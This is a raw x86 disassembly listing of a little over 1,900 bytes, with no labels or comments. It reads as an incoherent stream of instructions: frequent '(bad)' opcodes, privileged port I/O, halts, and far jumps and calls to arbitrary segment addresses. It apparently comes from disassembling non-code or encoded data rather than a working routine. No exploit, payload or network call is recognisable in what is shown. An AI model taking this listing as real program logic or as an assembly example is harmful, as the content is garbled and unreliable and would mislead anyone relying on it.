  402812:	pminsw mm4,QWORD PTR [eax-0x47032042]
  402819:	mov    cl,0xd7
  40281b:	or     ah,0x41
  40281e:	ror    BYTE PTR [edx+ecx*1-0x5cfa2671],0x73
  402826:	mov    BYTE PTR [eax+0x3f890c4a],dh
  40282c:	xchg   esi,eax
  40282d:	push   ecx
  40282e:	adc    edx,DWORD PTR [edx]
  402830:	fwait
  402831:	sbb    BYTE PTR ds:0xcc5e0fd6,cl
  402837:	ret    
  402838:	sub    bl,BYTE PTR [eax]
  40283a:	push   ebx
  40283b:	fnstenv [esi+0x33]
  40283e:	push   cs
  40283f:	push   ecx
  402840:	pop    eax
  402841:	mov    ebx,0xeadcf8a8
  402846:	pop    ds
  402847:	aaa    
  402848:	cld    
  402849:	fstp   TBYTE PTR [edi-0x7f56e132]
  40284f:	(bad)  
  402850:	stos   DWORD PTR es:[edi],eax
  402851:	adc    BYTE PTR [edi+0x7c383c78],ch
  402857:	popa   
  402858:	or     eax,0x8c243da7
  40285d:	out    0xb9,eax
  40285f:	jb     0x402869
  402861:	cmp    DWORD PTR [edi+0x30],ecx
  402864:	xor    eax,0xd6afda39
  402869:	shl    cl,cl
  40286b:	sbb    bh,cl
  40286d:	fadd   st(7),st
  40286f:	neg    DWORD PTR [ebp-0x5a]
  402872:	ret    
  402873:	aam    0x22
  402875:	test   ah,al
  402877:	test   DWORD PTR [edi-0x5d6ad98],esp
  40287d:	int    0x4d
  40287f:	add    eax,0x8ae9642b
  402884:	cdq    
  402885:	pop    edi
  402886:	iret   
  402887:	lahf   
  402888:	jb     0x4028df
  40288a:	test   BYTE PTR [eax],dh
  40288c:	inc    ebp
  40288d:	inc    ebx
  40288e:	fild   DWORD PTR [edi+esi*1-0x19]
  402892:	xchg   edi,eax
  402893:	mov    edi,ecx
  402895:	mov    esi,ecx
  402897:	repz ds xchg edi,eax
  40289a:	in     al,dx
  40289b:	dec    esi
  40289c:	into   
  40289d:	pop    edx
  40289e:	xchg   dl,cl
  4028a0:	ret    0xce53
  4028a3:	idiv   BYTE PTR [esi+0x57]
  4028a6:	stc    
  4028a7:	push   eax
  4028a8:	inc    ebx
  4028a9:	mov    ds:0x909b5c50,eax
  4028ae:	loopne 0x40283a
  4028b0:	std    
  4028b1:	repnz das 
  4028b3:	push   ecx
  4028b4:	or     DWORD PTR [edx+eiz*8+0x4e061ff8],0x6e805f0c
  4028bf:	pop    esp
  4028c0:	dec    esp
  4028c1:	clc    
  4028c2:	fdivrp st(4),st
  4028c4:	xchg   DWORD PTR [edi+0x63],ebx
  4028c7:	cmp    BYTE PTR [ebx-0x6d],dh
  4028ca:	sub    BYTE PTR [edi+edi*1+0x60541a79],bl
  4028d1:	xchg   esp,eax
  4028d2:	test   eax,0x32c93517
  4028d7:	jle    0x402888
  4028d9:	shl    BYTE PTR [ebx+0xa395401],0xf5
  4028e0:	and    al,0x4b
  4028e2:	adc    esi,DWORD PTR ds:0x46bc1109
  4028e8:	stos   DWORD PTR es:[edi],eax
  4028e9:	pop    esp
  4028ea:	imul   ebp,ebx,0x232a50c
  4028f0:	fxch   st(4)
  4028f2:	jmp    0xd3270459
  4028f7:	test   al,0xb3
  4028f9:	push   ds
  4028fa:	dec    esp
  4028fb:	mov    bh,0x40
  4028fd:	sub    al,0x4d
  4028ff:	pop    edi
  402900:	out    0xd9,al
  402902:	sar    BYTE PTR [eax+edi*2-0x43],1
  402906:	jbe    0x4028d2
  402908:	sbb    ebp,DWORD PTR [ecx-0x1daf19a0]
  40290e:	int    0x66
  402910:	or     ebx,DWORD PTR [esi]
  402912:	test   eax,0x411dedcd
  402917:	ror    DWORD PTR [esi+0x37],0x17
  40291b:	mov    cl,0xed
  40291d:	ret    
  40291e:	repnz pop edx
  402920:	cmp    DWORD PTR [ebp-0x3c9825aa],esi
  402926:	stos   BYTE PTR es:[edi],al
  402927:	push   DWORD PTR [esi]
  402929:	xchg   ebp,ebx
  40292b:	xor    eax,0xf2f62069
  402930:	lods   eax,DWORD PTR ds:[esi]
  402931:	push   eax
  402932:	stc    
  402933:	add    al,0xe3
  402935:	outs   dx,BYTE PTR ds:[esi]
  402936:	push   ds
  402937:	push   0xbe717fd3
  40293c:	sahf   
  40293d:	jg     0x40297f
  40293f:	push   edi
  402940:	mov    al,0x5b
  402942:	sub    ecx,edi
  402944:	sbb    ah,BYTE PTR [edi-0x6e]
  402947:	pop    eax
  402948:	(bad)  
  40294a:	mov    ds:0x3ff995ea,eax
  40294f:	sub    ecx,eax
  402951:	sbb    edi,edi
  402953:	cmp    al,0x2b
  402955:	cmp    eax,DWORD PTR [edi]
  402957:	adc    BYTE PTR [eax+0x6a],cl
  40295a:	dec    eax
  40295b:	mov    DWORD PTR [ebp+ebp*2+0x29c5dbbd],ebp
  402962:	inc    ebx
  402963:	jbe    0x402962
  402965:	pop    edi
  402966:	sbb    ah,BYTE PTR [ebp+edi*1-0x1bfb659c]
  40296d:	mov    dh,0x9d
  40296f:	aam    0x3d
  402971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402972:	ds das 
  402974:	dec    ecx
  402976:	dec    ecx
  402977:	call   FWORD PTR [edx]
  402979:	or     bh,BYTE PTR [esi+0x7b]
  40297c:	in     eax,0x7b
  40297e:	fisttp QWORD PTR [ebx+0x182f3915]
  402984:	ror    BYTE PTR [ebx],1
  402986:	out    0x1b,al
  402988:	(bad)
  40298b:	jmp    0xfc6ecdb6
  402990:	jne    0x402962
  402992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402993:	in     eax,dx
  402994:	push   ds
  402995:	nop
  402996:	(bad)  
  402997:	jmp    0xed0c:0xa64a2981
  40299e:	dec    esp
  40299f:	jmp    FWORD PTR [edi+0x15dee115]
  4029a5:	pop    esi
  4029a6:	ss or  eax,0xa1acc493
  4029ac:	sub    cl,BYTE PTR [ebx+0x39235ef2]
  4029b2:	or     al,0x91
  4029b4:	adc    ebx,DWORD PTR [edi+0x3f]
  4029b7:	in     eax,0x3a
  4029b9:	jp     0x40299b
  4029bb:	sub    eax,0xc396a8df
  4029c0:	mov    BYTE PTR [edx],bh
  4029c2:	pop    ds
  4029c3:	call   0xc156:0xb4859140
  4029ca:	imul   DWORD PTR [ebx+0x7e287765]
  4029d0:	fdivr  QWORD PTR [edx+esi*2-0x1e]
  4029d4:	and    eax,0x9a670533
  4029d9:	popa   
  4029da:	inc    edi
  4029db:	inc    eax
  4029dc:	ins    BYTE PTR es:[edi],dx
  4029dd:	cld    
  4029de:	out    dx,eax
  4029df:	dec    esp
  4029e0:	test   BYTE PTR [ebx+0x319a0403],0xae
  4029e7:	sub    ebp,DWORD PTR [ebx+edx*8+0x29625e5]
  4029ee:	retf   0x575c
  4029f1:	sbb    ebx,ebp
  4029f3:	inc    eax
  4029f4:	(bad)  
  4029f5:	aad    0x80
  4029f7:	ss stos BYTE PTR es:[edi],al
  4029f9:	fdivr  QWORD PTR [ebp-0xf]
  4029fc:	mov    edx,0x4dd9505c
  402a01:	mov    DWORD PTR [ecx+0x3e0ab8a7],edx
  402a07:	stc    
  402a08:	sub    BYTE PTR [edx-0x6d4de941],dh
  402a0e:	push   edx
  402a0f:	xor    BYTE PTR [esi-0x31774286],al
  402a15:	sbb    eax,0x5f6bd807
  402a1a:	in     eax,dx
  402a1b:	xchg   DWORD PTR [eax-0x40],edx
  402a1e:	mov    ch,al
  402a20:	enter  0xe690,0xdb
  402a24:	pop    esi
  402a25:	push   0xd3159608
  402a2a:	dec    esi
  402a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a2c:	(bad)  
  402a2d:	jbe    0x402a72
  402a2f:	pop    ecx
  402a30:	in     al,dx
  402a31:	jo     0x402a93
  402a33:	jmp    0xb8b5:0xf7696037
  402a3a:	fisttp WORD PTR [edx+0x68]
  402a3d:	mov    ch,dl
  402a3f:	mov    al,0xe3
  402a41:	test   eax,0x511632f9
  402a46:	jp     0x402a36
  402a48:	add    eax,0xc470e31
  402a4d:	loope  0x402abc
  402a4f:	iret   
  402a50:	push   es
  402a51:	fld    st(5)
  402a53:	out    0xd,al
  402a55:	neg    DWORD PTR [edx-0x59]
  402a58:	or     al,0x64
  402a5a:	sti    
  402a5b:	xchg   esi,eax
  402a5c:	mov    ds:0x83203eb5,ax
  402a62:	jl     0x402a17
  402a64:	or     eax,0x5c397d95
  402a69:	xchg   esp,ebp
  402a6b:	test   BYTE PTR [ebx],cl
  402a6d:	push   0x29ce4562
  402a72:	adc    BYTE PTR [edx+ecx*4-0x64],0xbf
  402a77:	or     ecx,DWORD PTR [esi]
  402a79:	mov    ebx,0xa167a191
  402a7e:	call   0x37a6e3f0
  402a83:	popf   
  402a84:	xchg   ecx,eax
  402a85:	mov    edi,0xc9f86a86
  402a8a:	fst    st(5)
  402a8c:	call   0xcb39:0x790b419f
  402a93:	jle    0x402a4b
  402a95:	xchg   ebp,eax
  402a96:	int    0xa6
  402a98:	sbb    al,0x56
  402a9a:	sbb    eax,0xb1519e83
  402a9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aa0:	adc    ah,BYTE PTR [esi+0x256a5bba]
  402aa6:	shl    dl,1
  402aa8:	mov    ds:0xe43a9f37,al
  402aad:	mov    al,ds:0xfdc3c312
  402ab2:	add    eax,0xc065de4b
  402ab7:	icebp  
  402ab8:	xchg   DWORD PTR [ebp-0x6d05a0c],esp
  402abe:	xor    al,0x47
  402ac0:	out    0x92,al
  402ac2:	xchg   ecx,eax
  402ac3:	adc    eax,0xc6718b07
  402ac8:	mov    WORD PTR [eax+ebp*2-0x303a95e3],?
  402acf:	sbb    bh,al
  402ad1:	lock fs pop es
  402ad4:	dec    esi
  402ad5:	xor    dl,bl
  402ad7:	mov    ebx,0x931a28b7
  402adc:	push   edx
  402add:	sub    al,0x55
  402adf:	cmp    eax,0x184a082a
  402ae4:	ret    0xd162
  402ae7:	shl    ebp,0xf1
  402aea:	or     esp,DWORD PTR [eax-0xac4306b]
  402af0:	loop   0x402a96
  402af2:	inc    ecx
  402af3:	pop    DWORD PTR [edx-0x47]
  402af6:	cdq    
  402af7:	mov    bh,0x46
  402af9:	je     0x402afc
  402afb:	adc    al,bl
  402afd:	inc    ebp
  402afe:	(bad)  
  402aff:	sbb    dh,BYTE PTR [edi+0x5f77d5c9]
  402b05:	jnp    0x402a90
  402b07:	je     0x402ae2
  402b09:	push   ds
  402b0a:	jne    0x402adc
  402b0c:	push   0x9
  402b0e:	retf   
  402b0f:	(bad)  
  402b10:	pop    ecx
  402b11:	cmp    ah,bh
  402b13:	jp     0x402ab6
  402b15:	outs   dx,BYTE PTR ds:[esi]
  402b16:	hlt    
  402b17:	ins    BYTE PTR es:[edi],dx
  402b18:	jnp    0x402ac8
  402b1a:	stos   DWORD PTR es:[edi],eax
  402b1b:	push   edx
  402b1c:	call   0x262c:0x407401cc
  402b23:	int    0x81
  402b25:	mov    esp,ebx
  402b27:	inc    edx
  402b28:	adc    DWORD PTR [eax],edi
  402b2a:	nop
  402b2b:	xor    ecx,ebx
  402b2d:	in     al,dx
  402b2e:	pop    esi
  402b2f:	lock or ecx,esi
  402b32:	sub    eax,esi
  402b34:	test   al,0x89
  402b36:	je     0x402aed
  402b38:	sub    DWORD PTR [edx+0x0],ecx
  402b3b:	xchg   ebx,eax
  402b3c:	fs add al,0xab
  402b3f:	int    0xa5
  402b41:	outs   dx,DWORD PTR ds:[esi]
  402b42:	xchg   ebp,eax
  402b43:	jecxz  0x402af5
  402b45:	lock adc bh,dh
  402b48:	add    BYTE PTR [ecx-0x36],bh
  402b4b:	dec    eax
  402b4c:	(bad)  
  402b4d:	(bad)  
  402b4e:	cs int3 
  402b50:	sub    DWORD PTR [edx],ebp
  402b52:	pop    es
  402b53:	push   edx
  402b54:	mov    eax,0x1e706e18
  402b59:	adc    BYTE PTR [esi+eax*1+0x47],dh
  402b5d:	lds    esi,FWORD PTR [ecx+0x55]
  402b60:	scas   al,BYTE PTR es:[edi]
  402b61:	loope  0x402b12
  402b63:	inc    esi
  402b64:	mov    al,0x57
  402b66:	sub    BYTE PTR [edx],cl
  402b68:	pop    ss
  402b69:	xchg   cl,dh
  402b6b:	and    BYTE PTR [esi+0x6ea9445f],bl
  402b71:	loope  0x402b92
  402b73:	ficom  WORD PTR [edi]
  402b75:	pop    ss
  402b76:	jae    0x402b3b
  402b78:	jno    0x402bb7
  402b7a:	dec    esp
  402b7b:	sub    al,BYTE PTR [ebx]
  402b7d:	(bad)  
  402b7e:	and    edi,esp
  402b80:	ror    ebp,cl
  402b82:	pusha  
  402b83:	imul   ebx,DWORD PTR [edi-0x44819369],0xd1884a17
  402b8d:	loopne 0x402b9b
  402b8f:	dec    ecx
  402b90:	push   ebp
  402b91:	mov    BYTE PTR [ecx+0x73f2c501],ah
  402b97:	neg    dh
  402b99:	enter  0x96ae,0x92
  402b9d:	push   ecx
  402b9e:	adc    BYTE PTR [ebx+0x49],dl
  402ba1:	test   ecx,edi
  402ba3:	int3   
  402ba4:	and    ebp,DWORD PTR [esi+0x52]
  402ba7:	jae    0x402b56
  402ba9:	scas   eax,DWORD PTR es:[edi]
  402baa:	mov    dh,0x3a
  402bac:	inc    edi
  402bad:	icebp  
  402bae:	clc    
  402baf:	xor    dh,0x5c
  402bb2:	mov    ch,0x5d
  402bb4:	lea    ecx,[esi-0x31]
  402bb7:	mov    WORD PTR [edx-0x3094825c],?
  402bbd:	cwde   
  402bbe:	sub    dh,al
  402bc0:	movntq QWORD PTR [edi-0x3f],mm1
  402bc4:	sar    DWORD PTR [esi-0x21],1
  402bc7:	mov    ebx,0x121ec4fc
  402bcc:	stc    
  402bcd:	fild   WORD PTR [eax+0x10]
  402bd0:	pop    edi
  402bd1:	(bad)  
  402bd3:	mov    dh,0xed
  402bd5:	ret    0x7cfd
  402bd8:	or     eax,0x6471089a
  402bdd:	retf   
  402bde:	adc    ah,BYTE PTR [ecx-0x15]
  402be1:	es pop ebx
  402be3:	rcr    DWORD PTR [esi],1
  402be5:	xchg   ebp,eax
  402be6:	shl    edx,1
  402be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402be9:	mov    edi,0x711bd987
  402bee:	ins    BYTE PTR es:[edi],dx
  402bef:	sahf   
  402bf0:	jno    0x402b88
  402bf2:	pop    ebp
  402bf3:	test   esp,esp
  402bf5:	lock add BYTE PTR [esi],0x14
  402bf9:	rcpps  xmm3,XMMWORD PTR [esi]
  402bfc:	in     eax,0xab
  402bfe:	xchg   ah,ch
  402c00:	(bad)  
  402c01:	mov    esi,0x9d2fff7b
  402c06:	mov    DWORD PTR [ebx],ebp
  402c08:	fisubr DWORD PTR [esi-0x75]
  402c0b:	ins    BYTE PTR es:[edi],dx
  402c0c:	js     0x402c5e
  402c0e:	fistp  QWORD PTR [esi+0x750ad1a0]
  402c14:	lahf   
  402c15:	js     0x402c6a
  402c17:	push   ebx
  402c18:	push   DWORD PTR [edx]
  402c1a:	dec    edx
  402c1b:	and    al,0xb9
  402c1d:	pop    edi
  402c1e:	add    eax,0x4935021e
  402c23:	scas   eax,DWORD PTR es:[edi]
  402c24:	mov    ecx,0x52493b26
  402c29:	aas    
  402c2a:	sub    eax,0x7b1b997d
  402c2f:	sbb    dl,dh
  402c31:	sbb    ecx,DWORD PTR [edx+ebp*2]
  402c34:	mov    al,ds:0x273ff64
  402c39:	push   0x2f129bca
  402c3e:	idiv   BYTE PTR [ecx]
  402c40:	jmp    0x402bf1
  402c42:	fwait
  402c43:	mov    bh,0xd5
  402c45:	sub    eax,0xa0bb95a8
  402c4a:	mov    eax,ds:0x65f4d45d
  402c4f:	fdiv   QWORD PTR [edi+0x61c26191]
  402c55:	mov    eax,0xe0ea0d2b
  402c5a:	leave  
  402c5b:	je     0x402bf1
  402c5d:	loopne 0x402c96
  402c5f:	dec    edx
  402c60:	out    0x45,eax
  402c62:	in     eax,dx
  402c63:	enter  0xcf91,0x8
  402c67:	std    
  402c68:	popa   
  402c69:	imul   ebp,ebx,0xff42e596
  402c6f:	mov    edx,0x682d1032
  402c74:	push   0x16
  402c76:	push   ss
  402c77:	push   edi
  402c78:	jmp    0x1612:0x24859ba3
  402c7f:	pushw  ds
  402c81:	fdivp  st(1),st
  402c83:	mov    ebx,0x6c49f0b3
  402c88:	xlat   BYTE PTR ds:[ebx]
  402c89:	(bad)  
  402c8a:	test   al,0x36
  402c8c:	inc    esi
  402c8d:	push   ebx
  402c8e:	sub    DWORD PTR [edi-0x3b],edi
  402c91:	daa    
  402c92:	cmp    al,0x36
  402c94:	repz loope 0x402c1c
  402c97:	dec    esp
  402c98:	call   FWORD PTR [ebx+esi*2+0x6c]
  402c9c:	ja     0x402c4f
  402c9e:	test   BYTE PTR [edx],ah
  402ca0:	fld    QWORD PTR [esi]
  402ca2:	das    
  402ca3:	mov    esp,DWORD PTR [edx]
  402ca5:	retf   
  402ca6:	pop    edx
  402ca7:	pop    eax
  402ca8:	outs   dx,BYTE PTR ds:[esi]
  402ca9:	xchg   ch,al
  402cab:	mov    esi,0x1cfdd96d
  402cb0:	sbb    al,0xe0
  402cb2:	sub    cl,dh
  402cb4:	xor    DWORD PTR [edx+esi*2-0x27],ebp
  402cb8:	push   ebx
  402cb9:	in     eax,dx
  402cba:	mov    esp,0xd8d83d8a
  402cbf:	out    dx,eax
  402cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cc1:	(bad)  
  402cc2:	fdiv   QWORD PTR [edx-0x78]
  402cc5:	xlat   BYTE PTR ds:[ebx]
  402cc6:	dec    edi
  402cc7:	jns    0x402c72
  402cc9:	mov    eax,ds:0x3e61c27c
  402cce:	sbb    BYTE PTR [eax-0x59],dl
  402cd1:	push   ebp
  402cd2:	xor    BYTE PTR [ebp-0x22],al
  402cd5:	mov    al,0x7c
  402cd7:	or     DWORD PTR [ecx],esp
  402cd9:	rol    DWORD PTR [eax-0x38b378ba],0x7a
  402ce0:	sbb    eax,0x688eebea
  402ce5:	dec    ebp
  402ce6:	stos   BYTE PTR es:[edi],al
  402ce7:	test   eax,0xc0103c8
  402cec:	imul   eax,DWORD PTR [esi+eiz*8+0x21db0859],0x5f
  402cf4:	ffree  st(0)
  402cf6:	add    al,0xee
  402cf8:	pop    esp
  402cf9:	or     bl,BYTE PTR [esi+0x55]
  402cfc:	enter  0x1b14,0x6
  402d00:	xchg   BYTE PTR [edi],bl
  402d02:	jecxz  0x402ceb
  402d04:	mov    ecx,0xf0e13d9e
  402d09:	add    bh,bl
  402d0b:	mov    ch,0x93
  402d0d:	imul   esp,DWORD PTR [edi+0x78],0xffffffa3
  402d11:	enter  0xb0ff,0x4c
  402d15:	adc    eax,0x673dfb40
  402d1a:	call   esi
  402d1c:	push   ebp
  402d1d:	in     al,dx
  402d1e:	shr    eax,0x21
  402d21:	imul   eax,DWORD PTR [edi-0x763bcc02],0x745db947
  402d2b:	in     al,0x67
  402d2d:	das    
  402d2e:	lods   al,BYTE PTR ds:[esi]
  402d2f:	mov    edx,0x5fc238d5
  402d34:	or     ecx,DWORD PTR [eax+esi*4-0x5c]
  402d38:	jp     0x402ce6
  402d3a:	cli    
  402d3b:	pusha  
  402d3c:	punpcklbw mm0,DWORD PTR [eax]
  402d3f:	clc    
  402d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d41:	das    
  402d42:	cmp    DWORD PTR [ebx],edx
  402d44:	xchg   BYTE PTR [eax+0x3f],dl
  402d47:	in     eax,dx
  402d48:	ret    0x3e28
  402d4b:	(bad)  
  402d4c:	xlat   BYTE PTR ds:[ebx]
  402d4d:	mov    cl,0xce
  402d4f:	int    0xa0
  402d51:	xor    edi,ebp
  402d53:	gs pop eax
  402d55:	call   0xd059:0x9e8abd5c
  402d5c:	lock add DWORD PTR [esi],eax
  402d5f:	mov    ebp,0x355e7c8
  402d64:	sub    cl,ah
  402d66:	adc    BYTE PTR [edi],bh
  402d68:	pop    es
  402d69:	mov    cl,0xdc
  402d6b:	mov    ah,BYTE PTR [edx+0x53]
  402d6e:	dec    esi
  402d6f:	add    ch,dl
  402d71:	int    0xa3
  402d73:	mov    ch,0x8d
  402d75:	(bad)  
  402d76:	mov    DWORD PTR [esi],ecx
  402d78:	mov    ebx,ebp
  402d7a:	in     eax,dx
  402d7b:	jle    0x402d34
  402d7d:	add    esp,DWORD PTR [edi+0x22]
  402d80:	xor    edi,ebx
  402d82:	and    BYTE PTR [ebx],ah
  402d84:	retf   0x94ec
  402d87:	dec    ecx
  402d88:	xchg   ebp,eax
  402d89:	sub    al,0x63
  402d8b:	add    DWORD PTR [ebx-0x15b78e0b],esi
  402d91:	and    dl,cl
  402d93:	das    
  402d94:	pop    ds
  402d95:	mov    bl,0xcd
  402d97:	addr16 add bh,dl
  402d9a:	scas   eax,DWORD PTR es:[edi]
  402d9b:	mov    eax,ds:0xf8978a8e
  402da0:	push   0x22
  402da2:	test   al,0x13
  402da4:	mov    edi,0x873fa63a
  402da9:	and    BYTE PTR [esi+ebp*8-0x33],0xf9
  402dae:	mov    cl,0x8a
  402db0:	icebp  
  402db1:	push   0x9a29770b
  402db6:	xchg   ebp,eax
  402db7:	clc    
  402db8:	add    BYTE PTR [ecx],ah
  402dba:	xchg   edi,eax
  402dbb:	or     BYTE PTR [ecx-0x42e345d6],0x7b
  402dc2:	xor    ecx,DWORD PTR [ecx-0x3b611819]
  402dc8:	mov    edi,0x16496a26
  402dcd:	mov    ebp,0xe15a8585
  402dd2:	sbb    BYTE PTR [ecx+edi*2],al
  402dd5:	std    
  402dd6:	mov    ecx,0xb605b300
  402ddb:	call   0x6d3a:0x65c0725
  402de2:	mov    ds:0xa597d56e,al
  402de7:	sub    BYTE PTR [edi+eiz*4-0x71],cl
  402deb:	test   DWORD PTR [esi-0x56],ecx
  402dee:	push   cs
  402def:	xor    DWORD PTR [ecx-0x74],edi
  402df2:	aam    0x66
  402df4:	or     al,0x9c
  402df6:	sti    
  402df7:	fsincos 
  402df9:	ret    0xf42c
  402dfc:	push   esi
  402dfd:	ins    BYTE PTR es:[edi],dx
  402dfe:	push   0xb37fba6e
  402e03:	lods   eax,DWORD PTR ds:[esi]
  402e04:	fild   DWORD PTR [ecx-0x554bc3b2]
  402e0a:	mov    ah,BYTE PTR [edx+ebx*4]
  402e0d:	sbb    al,0xaf
  402e0f:	mov    BYTE PTR [edx+0x51326f10],bl
  402e15:	inc    ebx
  402e16:	ret    
  402e17:	jl     0x402e81
  402e19:	mov    ds:0xccb58302,al
  402e1e:	inc    esi
  402e1f:	adc    BYTE PTR [edx+0x16ada5e5],ch
  402e25:	iret   
  402e26:	(bad)  
  402e27:	pop    ebp
  402e28:	outs   dx,BYTE PTR ds:[esi]
  402e29:	xchg   edx,eax
  402e2a:	add    ah,BYTE PTR [eax-0x1b]
  402e2d:	and    ah,ch
  402e2f:	aas    
  402e30:	fisttp DWORD PTR [ecx-0x3f]
  402e33:	cld    
  402e34:	retf   0x9c42
  402e37:	xor    al,dh
  402e39:	sub    eax,0xd4005686
  402e3e:	adc    BYTE PTR [ebp-0x2dcfb69e],bl
  402e44:	add    BYTE PTR [ebx+0x58170ce7],dl
  402e4a:	rcl    DWORD PTR [ebx-0x186f6483],0xeb
  402e51:	rcl    DWORD PTR [ebp-0x2a912309],cl
  402e57:	and    edx,DWORD PTR [ecx+0x7d87609e]
  402e5d:	test   DWORD PTR [ebp-0x5],edx
  402e60:	xor    esp,esp
  402e62:	xchg   esi,eax
  402e63:	xchg   ebx,eax
  402e64:	pop    esi
  402e65:	shl    edi,1
  402e67:	mov    BYTE PTR [ebx+0x4b682ec5],dl
  402e6d:	cmp    al,0x27
  402e6f:	out    0x47,eax
  402e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e72:	jne    0x402e01
  402e74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e75:	xchg   ebp,eax
  402e76:	mov    ch,BYTE PTR [esi+0x4c726161]
  402e7c:	xchg   ebx,eax
  402e7d:	jo     0x402e1b
  402e7f:	imul   eax,DWORD PTR [eax+0x41cf8aba],0x9e7ad1c9
  402e89:	pusha  
  402e8a:	jns    0x402e56
  402e8c:	pushf  
  402e8d:	or     BYTE PTR [edx+0x25],dh
  402e90:	inc    ebx
  402e91:	scas   eax,DWORD PTR es:[edi]
  402e92:	dec    ebx
  402e93:	push   ds
  402e94:	hlt    
  402e95:	jl     0x402ea4
  402e97:	scas   al,BYTE PTR es:[edi]
  402e98:	rep outs dx,BYTE PTR ds:[esi]
  402e9a:	push   ebp
  402e9b:	inc    esp
  402e9c:	xchg   edi,eax
  402e9d:	fcmovb st,st(6)
  402e9f:	sti    
  402ea0:	cmp    ecx,DWORD PTR [esi+eax*4-0x2aaf46e6]
  402ea7:	jge    0x402e30
  402ea9:	out    dx,eax
  402eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eab:	iret   
  402eac:	xor    cl,BYTE PTR [edi-0x55]
  402eaf:	dec    ebp
  402eb0:	or     BYTE PTR [ecx],bl
  402eb2:	xchg   ecx,eax
  402eb3:	xor    bl,BYTE PTR [edx-0x3e3d4858]
  402eb9:	push   ss
  402eba:	gs out dx,al
  402ebc:	pop    fs
  402ebe:	jne    0x402ee6
  402ec0:	dec    esp
  402ec1:	mov    ch,BYTE PTR [edi]
  402ec3:	xor    bh,BYTE PTR [ecx+0x5d]
  402ec6:	arpl   WORD PTR fs:[esi-0x657a1bd3],bx
  402ecd:	outs   dx,DWORD PTR ds:[esi]
  402ece:	clc    
  402ecf:	xchg   ebp,eax
  402ed0:	xchg   esp,eax
  402ed1:	cld    
  402ed2:	mov    ah,0xeb
  402ed4:	jmp    0x402e59
  402ed6:	fwait
  402ed7:	or     dh,bh
  402ed9:	cwde   
  402eda:	xor    DWORD PTR [edi-0x46a7a4e4],0xffffffae
  402ee1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee2:	out    dx,eax
  402ee3:	daa    
  402ee4:	mov    ebx,0xbaf8ed0d
  402ee9:	fistp  WORD PTR [edi+ebx*8]
  402eec:	sar    DWORD PTR [ebx],1
  402eee:	out    dx,al
  402eef:	pusha  
  402ef0:	cmp    BYTE PTR [esp+edx*8],dh
  402ef3:	aaa    
  402ef4:	push   eax
  402ef5:	pop    esi
  402ef6:	jg     0x402f53
  402ef8:	popf   
  402ef9:	test   BYTE PTR [ecx],bl
  402efb:	gs popf 
  402efd:	loopne 0x402f74
  402eff:	jmp    0xab6e:0xd0f9c02c
  402f06:	jle    0x402eca
  402f08:	jecxz  0x402f08
  402f0a:	jecxz  0x402f1e
  402f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f0d:	jmp    0x402eeb
  402f0f:	std    
  402f10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f11:	dec    ebp
  402f12:	jnp    0x402f29
  402f14:	enter  0x7c29,0x6b
  402f18:	shl    BYTE PTR [edi],1
  402f1a:	test   al,0x63
  402f1c:	pop    ebx
  402f1d:	mov    ecx,gs
  402f1f:	push   0x76
  402f21:	mov    DWORD PTR [eax+eax*4-0x6b],ecx
  402f25:	jnp    0x402f04
  402f27:	pop    esp
  402f28:	or     bh,bl
  402f2a:	and    al,0x1e
  402f2c:	jo     0x402f67
  402f2e:	mov    ecx,0x79b1170a
  402f33:	adc    edi,DWORD PTR [edi-0x44]
  402f36:	jnp    0x402f84
  402f38:	push   es
  402f39:	loop   0x402fb4
  402f3b:	jno    0x402f3b
  402f3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3e:	push   0xfffffff3
  402f40:	imul   edi,DWORD PTR [ebx-0x3],0x64ff69c6
  402f47:	pushf  
  402f48:	or     edi,DWORD PTR [ecx*1+0x7386eaed]
  402f4f:	xchg   esi,eax
  402f50:	add    BYTE PTR ds:0xd1f2fe69,al
  402f56:	or     DWORD PTR [ebp-0x5e],edi
  402f59:	mov    ah,0x8e
  402f5b:	mov    ebp,0xb2801ce
  402f60:	jle    0x402f39
  402f62:	xor    eax,0x22813434
  402f67:	xor    bh,BYTE PTR [edi+eax*2-0x48]
  402f6b:	in     eax,dx
  402f6c:	mov    bl,0x2d
  402f6e:	(bad)  
  402f6f:	sbb    eax,ebp
  402f71:	sahf   
  402f72:	push   edi
  402f73:	inc    esp
  402f74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f75:	iret   
  402f76:	clc    
  402f77:	dec    ebx
  402f78:	imul   edi,DWORD PTR [eax-0x40b07bc3],0x47
  402f7f:	sti    
  402f80:	xchg   al,ah
  402f82:	fldenv [ebx]
  402f84:	xchg   BYTE PTR [ebx+0x1b],bh
  402f87:	and    ecx,DWORD PTR [esi+0x72eebb0]
  402f8d:	push   ecx
  402f8e:	mov    ds,ebp
  402f90:	mov    esp,0x6cc7f619
  402f95:	out    dx,al
  402f96:	jg     0x402fb1
  402f98:	ja     0x402f84
  402f9a:	push   cs
  402f9b:	imul   eax,DWORD PTR [edi-0x3dd1a1c6],0xffffffc3
  402fa2:	inc    esi
  402fa3:	int3   
  402fa4:	in     al,dx
  402fa5:	pop    edx
  402fa6:	add    BYTE PTR [ebp-0x13e0b9b],al
  402fac:	cmp    al,0x84
  402fae:	adc    BYTE PTR [eax],dl
  402fb0:	push   ebx
  402fb1:	das    
  402fb2:	arpl   WORD PTR [edi+0x60bc9913],dx
  402fb8:	inc    ebx
  402fb9:	xor    dh,al
  402fbb:	pop    esp
  402fbc:	pusha  
  402fbd:	pop    es
  402fbe:	shr    DWORD PTR [edi-0x23c2065f],0x7b
  402fc5:	pushf  
  402fc6:	or     BYTE PTR [ebx+0x33c8f96e],al
  402fcc:	stc    
